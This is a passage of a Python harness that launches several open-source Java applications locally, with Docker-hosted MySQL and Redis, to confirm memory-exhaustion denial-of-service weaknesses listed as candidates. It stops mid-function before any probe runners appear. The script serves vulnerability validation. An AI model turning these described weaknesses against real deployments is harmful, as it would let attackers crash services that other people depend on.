#!/usr/bin/env python3
"""Run application-level P0 dynamic OOM probes."""

from __future__ import annotations

import argparse
import base64
import csv
import dataclasses
import http.client
import http.cookiejar
import json
import os
import resource
import shutil
import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Mapping
from pathlib import Path
import re
from typing import Callable


BASE_DIR = Path(__file__).resolve().parents[1]
OUT_DIR = BASE_DIR / "results" / "applications_dynamic_validation" / "p0"
LOG_DIR = OUT_DIR / "logs"
RUNTIME_DIR = OUT_DIR / "runtime"
SMQTT_DIR = BASE_DIR / "frameworks" / "applications" / "quickmsg__smqtt"
XXL_JOB_DIR = BASE_DIR / "frameworks" / "applications" / "xuxueli__xxl-job"
WANGMARKET_DIR = BASE_DIR / "frameworks" / "applications" / "xnx3__wangmarket"
CITRUS_DIR = BASE_DIR / "frameworks" / "applications" / "yiuman__citrus"
WGCLOUD_DIR = BASE_DIR / "frameworks" / "applications" / "tianshiyeben__wgcloud"
POWERJOB_DIR = BASE_DIR / "frameworks" / "applications" / "powerjob__powerjob"
DCMP_DIR = BASE_DIR / "frameworks" / "applications" / "dromara__datacompare"
RYVF_DIR = BASE_DIR / "frameworks" / "applications" / "yangzongzhuan__ruoyi-vue-fast"
SMARTADMIN_DIR = BASE_DIR / "frameworks" / "applications" / "1024-lab__smart-admin" / "smart-admin-api-java17-springboot3"
OOM_MARKERS = (
    "java.lang.OutOfMemoryError",
    "OutOfMemoryError: Java heap space",
    "OutOfMemoryError: unable to create native thread",
    "GC overhead limit exceeded",
)


@dataclasses.dataclass(frozen=True)
class Candidate:
    candidate_id: str
    app: str
    title: str
    runner: str | None
    blocked_reason: str = ""


@dataclasses.dataclass
class ProbeResult:
    candidate_id: str
    app: str
    title: str
    status: str
    dynamic_verdict: str
    true_positive: bool
    oom_signal: str
    requests_sent: int
    heap: str
    log: str
    evidence: dict[str, object]
    notes: str = ""


P0_CANDIDATES: tuple[Candidate, ...] = (
    Candidate(
        "SMARTADMIN-STATIC-0001",
        "1024-lab__smart-admin",
        "Low-privilege code-generator config can amplify Velocity/ZIP generation",
        "smartadmin_codegen",
    ),
    Candidate(
        "DCMP-STATIC-0001",
        "dromara__datacompare",
        "Default demo operation endpoints retain submitted users in a static map",
        "dcmp_demo_operate",
    ),
    Candidate(
        "DCMP-STATIC-0002",
        "dromara__datacompare",
        "Default Swagger test user API retains submitted users in a static map",
        "dcmp_test_user_save",
    ),
    Candidate(
        "EA-STATIC-0001",
        "megaease__easeagent",
        "Default internal NanoHTTPD server creates an unbounded daemon thread per external connection",
        None,
        "EaseAgent 默认形态是 Java agent 注入目标 JVM；需要受控被注入应用和 9900 server 启动证据。",
    ),
    Candidate(
        "EA-STATIC-0002",
        "megaease__easeagent",
        "Default unauthenticated config/control routes parse unbounded POST/PUT bodies into heap",
        None,
        "EaseAgent 默认形态是 Java agent 注入目标 JVM；需要受控被注入应用和 9900 config route 启动证据。",
    ),
    Candidate(
        "POWERJOB-APP-STATIC-0002",
        "powerjob__powerjob",
        "Pre-auth request body caching copies ordinary POST bodies into heap under default server heap",
        "powerjob_body_cache",
    ),
    Candidate(
        "SMQTT-APP-STATIC-0002",
        "quickmsg__smqtt",
        "Anonymous retained MQTT publishes fill an unbounded in-memory retainMessages map",
        "smqtt_retain",
    ),
    Candidate(
        "SMQTT-APP-STATIC-0004",
        "quickmsg__smqtt",
        "Offline persistent subscriptions accumulate unbounded session message queues",
        "smqtt_offline_queue",
    ),
    Candidate(
        "SMQTT-APP-STATIC-0005",
        "quickmsg__smqtt",
        "Anonymous subscriptions grow global fixed/wildcard topic indexes without per-client quotas",
        "smqtt_subscriptions",
    ),
    Candidate(
        "WGCLOUD-APP-STATIC-0001",
        "tianshiyeben__wgcloud",
        "AuthRestFilter creates server-side HttpSession objects before authentication",
        "wgcloud_session_growth",
    ),
    Candidate(
        "WANGMARKET-APP-STATIC-0001",
        "xnx3__wangmarket",
        "Anonymous captcha/login checks can create unbounded in-memory Shiro sessions",
        "wangmarket_captcha_sessions",
    ),
    Candidate(
        "XXL-JOB-APP-STATIC-0001",
        "xuxueli__xxl-job",
        "Default-token /trigger creates one JobThread per unique jobId",
        "xxl_unique_job_threads",
    ),
    Candidate(
        "XXL-JOB-APP-STATIC-0002",
        "xuxueli__xxl-job",
        "Same-job /trigger retains unique logId and TriggerRequest in an unbounded queue",
        "xxl_same_job_queue",
    ),
    Candidate(
        "RYVF-APP-STATIC-0001",
        "yangzongzhuan__ruoyi-vue-fast",
        "Low-privileged /test/user/save stores UserEntity entries in a static LinkedHashMap",
        "ryvf_test_user_save",
    ),
    Candidate(
        "CITRUS-APP-STATIC-0001",
        "yiuman__citrus",
        "Anonymous /rest/verify/captcha creates unbounded HttpSession-retained Captcha objects",
        "citrus_captcha_sessions",
    ),
)


def rel(path: Path) -> str:
    try:
        return path.relative_to(BASE_DIR).as_posix()
    except ValueError:
        return path.as_posix()


def run(command: list[str], cwd: Path) -> subprocess.CompletedProcess[str]:
    print("$ " + " ".join(command))
    return subprocess.run(command, cwd=cwd, check=False, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


def docker_available() -> bool:
    return shutil.which("docker") is not None and subprocess.run(
        ["docker", "info"],
        check=False,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    ).returncode == 0


def docker_run(command: list[str], timeout: float | None = None) -> subprocess.CompletedProcess[str]:
    print("$ " + " ".join(command))
    return subprocess.run(
        command,
        cwd=BASE_DIR,
        check=False,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
    )


def docker_image_exists(image: str) -> bool:
    completed = docker_run(["docker", "image", "inspect", image])
    return completed.returncode == 0


def docker_pull_first(images: list[str]) -> str:
    last_output = ""
    for image in images:
        if docker_image_exists(image):
            return image
        try:
            completed = docker_run(["docker", "pull", image], timeout=90)
        except subprocess.TimeoutExpired:
            last_output += f"\n## {image}\nTimed out after 90 seconds"
            continue
        if completed.returncode == 0:
            return image
        last_output += f"\n## {image}\n{completed.stdout}"
    raise RuntimeError(f"docker image pull failed:{last_output}")


def docker_rm(name: str) -> None:
    docker_run(["docker", "rm", "-f", name])


def start_mysql_container(name: str, port: int, root_password: str, mysql_version: str = "8.0") -> str:
    if not docker_available():
        raise RuntimeError("docker is not available for MySQL dependency")
    docker_rm(name)
    image = docker_pull_first(
        [
            f"docker.1ms.run/mysql:{mysql_version}",
            f"mysql:{mysql_version}",
        ]
    )
    completed = docker_run(
        [
            "docker",
            "run",
            "-d",
            "--name",
            name,
            "-e",
            f"MYSQL_ROOT_PASSWORD={root_password}",
            "-e",
            "MYSQL_ROOT_HOST=%",
            "-p",
            f"127.0.0.1:{port}:3306",
            image,
            "--character-set-server=utf8mb4",
            "--collation-server=utf8mb4_unicode_ci",
            "--lower_case_table_names=1",
        ]
    )
    if completed.returncode != 0:
        raise RuntimeError(f"failed to start MySQL container {name}:\n{completed.stdout}")
    if not wait_for_port(port, 120):
        raise RuntimeError(f"MySQL container {name} did not expose port {port}")
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        ping = docker_run(["docker", "exec", name, "mysqladmin", "ping", "-uroot", f"-p{root_password}", "--silent"])
        if ping.returncode == 0:
            wait_for_mysql_sql(name, root_password)
            return image
        time.sleep(2)
    raise RuntimeError(f"MySQL container {name} did not become ready")


def start_redis_container(name: str, port: int) -> str:
    if not docker_available():
        raise RuntimeError("docker is not available for Redis dependency")
    docker_rm(name)
    image = docker_pull_first(
        [
            "docker.1ms.run/redis:7-alpine",
            "redis:7-alpine",
        ]
    )
    completed = docker_run(["docker", "run", "-d", "--name", name, "-p", f"127.0.0.1:{port}:6379", image])
    if completed.returncode != 0:
        raise RuntimeError(f"failed to start Redis container {name}:\n{completed.stdout}")
    if not wait_for_port(port, 60):
        raise RuntimeError(f"Redis container {name} did not expose port {port}")
    return image


def mysql_exec(container: str, root_password: str, sql: str) -> None:
    completed = subprocess.run(
        ["docker", "exec", "-i", container, "mysql", "-uroot", f"-p{root_password}"],
        input=sql,
        cwd=BASE_DIR,
        check=False,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    if completed.returncode != 0:
        raise RuntimeError(f"MySQL exec failed in {container}:\n{completed.stdout}")


def wait_for_mysql_sql(container: str, root_password: str, timeout: float = 120) -> None:
    deadline = time.monotonic() + timeout
    last_output = ""
    while time.monotonic() < deadline:
        completed = subprocess.run(
            ["docker", "exec", "-i", container, "mysql", "-uroot", f"-p{root_password}", "-e", "SELECT 1"],
            cwd=BASE_DIR,
            check=False,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        if completed.returncode == 0:
            return
        last_output = completed.stdout
        time.sleep(2)
    raise RuntimeError(f"MySQL container {container} did not accept SQL before timeout:\n{last_output}")


def mysql_import(container: str, root_password: str, database: str, sql_path: Path) -> None:
    create_sql = (
        f"CREATE DATABASE IF NOT EXISTS `{database}` "
        "DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\n"
        f"USE `{database}`;\n"
    )
    mysql_exec(container, root_password, create_sql)
    sql = f"USE `{database}`;\n" + sql_path.read_text(encoding="utf-8", errors="replace")
    mysql_exec(container, root_password, sql)


def mysql_import_raw(container: str, root_password: str, sql_path: Path) -> None:
    mysql_exec(container, root_password, sql_path.read_text(encoding="utf-8", errors="replace"))


def mysql_import_raw_normalized(container: str, root_password: str, sql_path: Path) -> None:
    sql = sql_path.read_text(encoding="utf-8", errors="replace")
    sql = re.sub(r"(?im)^(\s*use)\s*\r?\n\s*([`A-Za-z0-9_-]+)\s*;", r"\1 \2;", sql)
    mysql_exec(container, root_password, sql)


def java_binary(preferred: tuple[str, ...] = ("java-17-openjdk", "java-21-openjdk", "java-22-openjdk")) -> str:
    for name in preferred:
        candidate = Path("/usr/lib/jvm") / name / "bin" / "java"
        if candidate.exists():
            return candidate.as_posix()
    return shutil.which("java") or "java"


def ensure_classpath(
    name: str,
    classpath_file: Path,
    mvn_cwd: Path,
    mvn_args: list[str],
    local_classes: list[Path],
    dependency_filter: Callable[[str], bool] | None = None,
) -> str:
    if not classpath_file.exists() or not classpath_file.read_text(encoding="utf-8").strip():
        completed = run(mvn_args, mvn_cwd)
        if completed.returncode != 0:
            raise RuntimeError(f"{name} classpath build failed:\n{completed.stdout}")
    dependency_items = [item for item in classpath_file.read_text(encoding="utf-8").strip().split(":") if item]
    if dependency_filter is not None:
        dependency_items = [item for item in dependency_items if dependency_filter(item)]
    dependencies = ":".join(dependency_items)
    existing_classes = [path.as_posix() for path in local_classes if path.exists()]
    return ":".join([*existing_classes, dependencies])


def smqtt_classpath() -> str:
    modules = [
        "smqtt-bootstrap",
        "smqtt-common",
        "smqtt-core",
        "smqtt-metric/smqtt-metric-influxdb",
        "smqtt-metric/smqtt-metric-prometheus",
        "smqtt-rule/smqtt-rule-dsl",
        "smqtt-rule/smqtt-rule-engine",
    ]
    return ensure_classpath(
        "smqtt",
        Path("/tmp/smqtt-classpath.txt"),
        SMQTT_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "smqtt-bootstrap",
            "-am",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/smqtt-classpath.txt",
        ],
        [SMQTT_DIR / module / "target" / "classes" for module in modules],
        dependency_filter=lambda item: "/io/github/quickmsg/" not in item,
    )


def xxl_job_classpath() -> str:
    return ensure_classpath(
        "xxl-job",
        Path("/tmp/xxl-job-springboot-classpath.txt"),
        XXL_JOB_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "xxl-job-executor-samples/xxl-job-executor-sample-springboot",
            "-am",
            "-DskipTests",
            "-Dgpg.skip=true",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/xxl-job-springboot-classpath.txt",
        ],
        [
            XXL_JOB_DIR / "xxl-job-executor-samples" / "xxl-job-executor-sample-springboot" / "target" / "classes",
            XXL_JOB_DIR / "xxl-job-core" / "target" / "classes",
        ],
    )


def wangmarket_classpath() -> str:
    web_libs = sorted((WANGMARKET_DIR / "target" / "classes" / "META-INF" / "resources" / "WEB-INF" / "lib").glob("*.jar"))
    return ensure_classpath(
        "wangmarket",
        Path("/tmp/p0-wangmarket-cp.txt"),
        WANGMARKET_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p0-wangmarket-cp.txt",
        ],
        [WANGMARKET_DIR / "target" / "classes", *web_libs],
    )


def citrus_classpath(include_mda: bool = True) -> str:
    modules = [
        "citrus-main",
        "citrus-boot-starter",
        "citrus-security",
        "citrus-support",
        "citrus-system",
        "citrus-workflow",
        "citrus-workflow-impl",
        "citrus-elasticsearch",
    ]
    if include_mda:
        modules.insert(5, "citrus-mda")
        runtime_mda_classes = citrus_runtime_mda_classes()
    else:
        runtime_mda_classes = None
    local_classes = [
        runtime_mda_classes if module == "citrus-mda" and runtime_mda_classes is not None else CITRUS_DIR / module / "target" / "classes"
        for module in modules
    ]
    return ensure_classpath(
        "citrus",
        Path("/tmp/p0-citrus-cp.txt"),
        CITRUS_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "citrus-main",
            "-am",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p0-citrus-cp.txt",
        ],
        local_classes,
        dependency_filter=lambda item: "/com/github/yiuman/citrus-mda/" not in item,
    )


def citrus_runtime_mda_classes() -> Path:
    patch_dir = RUNTIME_DIR / "citrus-classpath-patch"
    source_classes = CITRUS_DIR / "citrus-mda" / "target" / "classes"
    if source_classes.exists():
        shutil.rmtree(patch_dir, ignore_errors=True)
        shutil.copytree(source_classes, patch_dir)
    else:
        patch_dir.mkdir(parents=True, exist_ok=True)
    mapper_dir = patch_dir / "mapper"
    mapper_dir.mkdir(parents=True, exist_ok=True)
    broken_prefix = "com.github.yiuman.citrus.com.github.yiuman.citrus."
    fixed_prefix = "com.github.yiuman.citrus."
    for name in ("DdlMapper.xml", "DmlMapper.xml"):
        source = CITRUS_DIR / "citrus-mda" / "target" / "classes" / "mapper" / name
        if not source.exists():
            source = CITRUS_DIR / "citrus-mda" / "src" / "main" / "resources" / "mapper" / name
        text = source.read_text(encoding="utf-8", errors="replace")
        (mapper_dir / name).write_text(text.replace(broken_prefix, fixed_prefix), encoding="utf-8")
    return patch_dir


def citrus_runtime_properties(jdbc_url: str, redis_port: int) -> Path:
    config_path = RUNTIME_DIR / "citrus-p0.properties"
    escaped_jdbc_url = jdbc_url.replace("\\", "\\\\")
    config_path.write_text(
        "\n".join(
            [
                f"spring.datasource.url={escaped_jdbc_url}",
                "spring.datasource.username=root",
                "spring.datasource.password=yiuman",
                "spring.datasource.primary=default",
                "spring.datasource.enable-multiple-tx=false",
                f"spring.datasource.multiples.default.url={escaped_jdbc_url}",
                "spring.datasource.multiples.default.username=root",
                "spring.datasource.multiples.default.password=yiuman",
                "spring.datasource.multiples.default.driver-class-name=com.mysql.jdbc.Driver",
                "spring.datasource.multiples.default.type=com.alibaba.druid.pool.DruidDataSource",
                "spring.datasource.multiples.default.initialization-mode=never",
                "spring.datasource.multiples.default.hikari.maximum-pool-size=3",
                "spring.datasource.multiples.default.hikari.minimum-idle=1",
                "spring.redis.host=127.0.0.1",
                f"spring.redis.port={redis_port}",
                "citrus.verify.store=session",
                "citrus.verify.enable=true",
                "spring.activiti.database-schema-update=true",
                "",
            ]
        ),
        encoding="utf-8",
    )
    return config_path


def wgcloud_classpath() -> str:
    server_dir = WGCLOUD_DIR / "wgcloud-server"
    return ensure_classpath(
        "wgcloud",
        Path("/tmp/p0-wgcloud-cp.txt"),
        server_dir,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p0-wgcloud-cp.txt",
        ],
        [server_dir / "target" / "classes"],
    )


def powerjob_classpath() -> str:
    classes = sorted((POWERJOB_DIR / "powerjob-server").glob("*/target/classes"))
    classes.extend(
        [
            POWERJOB_DIR / "powerjob-client" / "target" / "classes",
            POWERJOB_DIR / "powerjob-common" / "target" / "classes",
        ]
    )
    classpath = ensure_classpath(
        "powerjob-server",
        Path("/tmp/p0-powerjob-server-cp.txt"),
        POWERJOB_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "powerjob-server/powerjob-server-starter",
            "-am",
            "-DskipTests",
            "-Dgpg.skip=true",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p0-powerjob-server-cp.txt",
        ],
        classes,
    )
    auth_cp = ensure_classpath(
        "powerjob-server-auth",
        Path("/tmp/p0-powerjob-auth-cp.txt"),
        POWERJOB_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "powerjob-server/powerjob-server-auth",
            "-am",
            "-DskipTests",
            "-Dgpg.skip=true",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p0-powerjob-auth-cp.txt",
        ],
        [],
    )
    m2 = BASE_DIR / ".build-cache" / "m2" / "repository"
    extra_jars = [
        m2 / "io" / "jsonwebtoken" / artifact / "0.11.5" / f"{artifact}-0.11.5.jar"
        for artifact in ("jjwt-api", "jjwt-impl", "jjwt-jackson")
    ]
    aliyun_extra_names = {
        "dingtalk-1.1.86.jar",
        "tea-1.4.2.jar",
        "tea-openapi-0.2.2.jar",
        "tea-util-0.2.13.jar",
        "openapiutil-0.1.14.jar",
        "endpoint-util-0.0.8.jar",
        "credentials-java-1.0.1.jar",
        "credentials-api-1.0.0.jar",
    }
    aliyun_extras = [
        path
        for path in (m2 / "com" / "aliyun").glob("**/*.jar")
        if path.name in aliyun_extra_names
    ]
    collection_jars = sorted((m2 / "org" / "apache" / "commons" / "commons-collections4").glob("*/*.jar"))
    extras = [
        path.as_posix()
        for path in [*extra_jars, *aliyun_extras, *collection_jars[-1:]]
        if path.exists()
    ]
    merged: list[str] = []
    for item in [*classpath.split(":"), *auth_cp.split(":"), *extras]:
        if item and item not in merged:
            merged.append(item)
    return ":".join(merged)


def dcmp_classpath() -> str:
    return ensure_classpath(
        "datacompare",
        Path("/tmp/p0-dcmp-cp.txt"),
        DCMP_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p0-dcmp-cp.txt",
        ],
        [DCMP_DIR / "target" / "classes"],
    )


def ryvf_classpath() -> str:
    return ensure_classpath(
        "ruoyi-vue-fast",
        Path("/tmp/p0-ryvf-cp.txt"),
        RYVF_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p0-ryvf-cp.txt",
        ],
        [RYVF_DIR / "target" / "classes"],
    )


def ryvf_logback_config() -> Path:
    log_dir = RUNTIME_DIR / "ryvf-logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    config_path = RUNTIME_DIR / "ryvf-logback.xml"
    config_path.write_text(
        """<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <appender name="console" class="ch.qos.logback.core.ConsoleAppender">
    <encoder>
      <pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{20} - %msg%n</pattern>
    </encoder>
  </appender>
  <logger name="com.ruoyi" level="INFO" />
  <logger name="org.springframework" level="WARN" />
  <logger name="sys-user" level="INFO" additivity="false">
    <appender-ref ref="console" />
  </logger>
  <root level="INFO">
    <appender-ref ref="console" />
  </root>
</configuration>
""",
        encoding="utf-8",
    )
    return config_path


def smartadmin_classpath() -> str:
    classpath_file = Path("/tmp/p0-smartadmin-cp.txt")
    if not classpath_file.exists() or not classpath_file.read_text(encoding="utf-8", errors="replace").strip():
        completed = run(
            [
                "mvn",
                "-q",
                f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
                "-DskipTests",
                "install",
            ],
            SMARTADMIN_DIR,
        )
        if completed.returncode != 0:
            raise RuntimeError(f"smart-admin local install failed:\n{completed.stdout}")
    return ensure_classpath(
        "smart-admin",
        classpath_file,
        SMARTADMIN_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "sa-admin",
            "-am",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p0-smartadmin-cp.txt",
        ],
        [
            SMARTADMIN_DIR / "sa-admin" / "target" / "classes",
            SMARTADMIN_DIR / "sa-base" / "target" / "classes",
        ],
        dependency_filter=lambda item: "/net/lab1024/sa-base/" not in item,
    )


def limit_child_process(nproc_limit: int | None) -> Callable[[], None] | None:
    if nproc_limit is None:
        return None

    def apply_limit() -> None:
        try:
            soft, hard = resource.getrlimit(resource.RLIMIT_NPROC)
            target = min(value for value in (soft, hard, nproc_limit) if value > 0)
            resource.setrlimit(resource.RLIMIT_NPROC, (target, target))
        except Exception:
            pass

    return apply_limit


def current_user_thread_count() -> int:
    uid = os.getuid()
    total = 0
    for status_path in Path("/proc").glob("[0-9]*/status"):
        try:
            uid_matches = False
            threads = 0
            for line in status_path.read_text(encoding="utf-8", errors="replace").splitlines():
                if line.startswith("Uid:"):
                    fields = line.split()
                    uid_matches = len(fields) > 1 and fields[1] == str(uid)
                elif line.startswith("Threads:"):
                    threads = int(line.split(":", 1)[1].strip())
            if uid_matches:
                total += threads
        except (OSError, ValueError):
            continue
    return total


def start_java(
    command: list[str],
    log_path: Path,
    cwd: Path,
    nproc_limit: int | None = None,
) -> tuple[subprocess.Popen[bytes], object]:
    log_path.parent.mkdir(parents=True, exist_ok=True)
    handle = log_path.open("wb")
    handle.write(("$ " + " ".join(command) + "\n").encode("utf-8"))
    handle.flush()
    process = subprocess.Popen(
        command,
        cwd=cwd,
        stdout=handle,
        stderr=subprocess.STDOUT,
        preexec_fn=limit_child_process(nproc_limit),
    )
    return process, handle


def stop_process(process: subprocess.Popen[bytes], handle: object) -> None:
    if process.poll() is None:
        process.terminate()
        try:
            process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait(timeout=10)
    handle.close()


def wait_for_port(port: int, timeout: float) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.5):
                return True
        except OSError:
            time.sleep(0.25)
    return False


def port_open(port: int) -> bool:
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=0.5):
            return True
    except OSError:
        return False


def read_status(process: subprocess.Popen[bytes]) -> dict[str, str]:
    status_path = Path("/proc") / str(process.pid) / "status"
    values: dict[str, str] = {}
    try:
        for line in status_path.read_text(encoding="utf-8", errors="replace").splitlines():
            if line.startswith(("VmRSS:", "VmHWM:", "Threads:")):
                key, value = line.split(":", 1)
                values[key] = value.strip()
    except OSError:
        pass
    return values


def log_text(log_path: Path) -> str:
    return log_path.read_text(encoding="utf-8", errors="replace") if log_path.exists() else ""


def oom_signal(log_path: Path) -> str:
    text = log_text(log_path)
    for marker in OOM_MARKERS:
        if marker in text:
            return marker
    return ""


def http_request(
    url: str,
    method: str = "GET",
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    opener: urllib.request.OpenerDirector | None = None,
    timeout: float = 10,
) -> tuple[int, bytes, dict[str, str]]:
    request = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    client = opener or urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        with client.open(request, timeout=timeout) as response:
            return response.status, response.read(), dict(response.headers)
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(), dict(exc.headers)


def wait_for_http(url: str, timeout: float, process: subprocess.Popen[bytes] | None = None) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if process is not None and process.poll() is not None:
            return False
        try:
            status, _, _ = http_request(url, timeout=2)
            if status < 500:
                return True
        except (urllib.error.URLError, TimeoutError, OSError):
            pass
        time.sleep(0.5)
    return False


def new_cookie_opener() -> urllib.request.OpenerDirector:
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.ProxyHandler({}), urllib.request.HTTPCookieProcessor(jar))


def local_http_request(
    port: int,
    path: str,
    method: str = "GET",
    body: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 5,
) -> tuple[int, bytes, dict[str, str]]:
    connection = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
    try:
        connection.request(method, path, body=body, headers=headers or {})
        response = connection.getresponse()
        data = response.read()
        return response.status, data, dict(response.getheaders())
    finally:
        connection.close()


def parse_json_body(body: bytes) -> dict[str, object]:
    try:
        value = json.loads(body.decode("utf-8", errors="replace"))
    except json.JSONDecodeError:
        return {}
    return value if isinstance(value, dict) else {}


def form_request(
    opener: urllib.request.OpenerDirector,
    url: str,
    fields: Mapping[str, object],
    timeout: float = 10,
) -> tuple[int, bytes, dict[str, str]]:
    data = urllib.parse.urlencode({key: str(value) for key, value in fields.items()}).encode("utf-8")
    return http_request(
        url,
        method="POST",
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        opener=opener,
        timeout=timeout,
    )


def json_request(
    url: str,
    payload: Mapping[str, object],
    headers: dict[str, str] | None = None,
    opener: urllib.request.OpenerDirector | None = None,
    timeout: float = 10,
) -> tuple[int, bytes, dict[str, str]]:
    request_headers = {"Content-Type": "application/json", **(headers or {})}
    return http_request(
        url,
        method="POST",
        data=json.dumps(payload).encode("utf-8"),
        headers=request_headers,
        opener=opener,
        timeout=timeout,
    )


def sm4_encrypt_for_smartadmin(plaintext: str) -> str:
    key_hex = "1024lab__1024lab".encode("utf-8").hex()
    completed = subprocess.run(
        ["openssl", "enc", "-sm4-ecb", "-K", key_hex, "-nosalt"],
        input=plaintext.encode("utf-8"),
        cwd=BASE_DIR,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    if completed.returncode != 0:
        raise RuntimeError(f"openssl SM4 encryption failed: {completed.stderr.decode('utf-8', errors='replace')}")
    encrypt_hex = completed.stdout.hex()
    return base64.b64encode(encrypt_hex.encode("utf-8")).decode("ascii")


def response_ok_json(body: bytes) -> bool:
    value = parse_json_body(body)
    code = value.get("code")
    ok = value.get("ok")
    return code == 0 or ok is True


def json_token(body: bytes) -> str:
    value = parse_json_body(body)
    token = value.get("token")
    if isinstance(token, str):
        return token
    data = value.get("data")
    if isinstance(data, dict):
        data_token = data.get("token")
        if isinstance(data_token, str):
            return data_token
    return ""


def spring_boot_command(
    heap: str,
    classpath: str,
    main_class: str,
    *args: str,
    jvm_args: tuple[str, ...] = (),
    java_preferred: tuple[str, ...] = ("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
) -> list[str]:
    return [
        java_binary(java_preferred),
        f"-Xmx{heap}",
        "-Djava.awt.headless=true",
        *jvm_args,
        "-cp",
        classpath,
        main_class,
        *args,
    ]


JAVA_LEGACY_OPENS = (
    "--add-opens=java.base/java.lang=ALL-UNNAMED",
    "--add-opens=java.base/java.lang.reflect=ALL-UNNAMED",
    "--add-opens=java.base/java.util=ALL-UNNAMED",
    "--add-opens=java.base/java.io=ALL-UNNAMED",
)


def start_wangmarket(case: Candidate, heap: str, port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    command = spring_boot_command(
        heap,
        wangmarket_classpath(),
        "com.Application",
        f"--server.port={port}",
        "--spring.datasource.url=jdbc:sqlite::resource:wangmarket.db",
        "--spring.datasource.driver-class-name=org.sqlite.JDBC",
        "--spring.jpa.database-platform=com.xnx3.j2ee.dialect.SQLiteDialect",
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = start_java(command, log_path, WANGMARKET_DIR)
    if not wait_for_http(f"http://127.0.0.1:{port}/captcha.do", 90, process):
        stop_process(process, handle)
        raise RuntimeError(f"WangMarket did not serve captcha.do on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_citrus(case: Candidate, heap: str, port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    command = spring_boot_command(
        heap,
        citrus_classpath(),
        "com.github.yiuman.citrus.CitrusApplication",
        f"--server.port={port}",
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = start_java(command, log_path, CITRUS_DIR / "citrus-main")
    if not wait_for_http(f"http://127.0.0.1:{port}/rest/verify/captcha", 90, process):
        stop_process(process, handle)
        raise RuntimeError(f"Citrus did not serve /rest/verify/captcha on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_citrus_full(
    case: Candidate,
    heap: str,
    port: int,
    mysql_port: int,
    redis_port: int,
    *,
    exclude_mda: bool = False,
    log_suffix: str = "",
) -> tuple[subprocess.Popen[bytes], object, Path]:
    jdbc_url = (
        f"jdbc:mysql://127.0.0.1:{mysql_port}/citrus?"
